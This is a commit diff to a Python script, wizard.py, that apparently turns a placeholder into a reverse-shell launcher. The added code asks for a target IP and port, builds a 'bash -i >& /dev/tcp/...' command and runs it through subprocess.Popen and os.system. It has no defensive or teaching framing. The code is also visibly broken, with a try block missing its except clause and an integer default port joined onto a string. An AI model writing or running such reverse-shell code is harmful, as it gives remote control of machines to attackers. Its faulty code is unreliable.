74e1f3f2eae520db28772991e620a6874527ba29
Izzys-right-hand-man <Ciii30@pcstudents.us>
2025-03-18 15:03:28 -0600

    Update wizard.py

--- wizard.py
+++ wizard.py
@@ -2,6 +2,9 @@ import os
 import sys
 import time
 import random
+import subprocess
+
+
 
 
 
@@ -10,4 +13,18 @@ addr = input("Target IPv4 address (ex: 10.10.10.10): ")
 
 prt = input("\n Target port enter for default(10000): ")
 
-payload = ""
+if prt == "":
+  prt = 10000
+
+payload = "bash -i >& /dev/tcp/" + addr + "/" + prt + " 0>&1"
+
+try:
+  subprocess.Popen(payload, shell=True)
+
+try:
+  os.system(payload)
+
+except:
+  print("Unable to generate payload!")
+
+
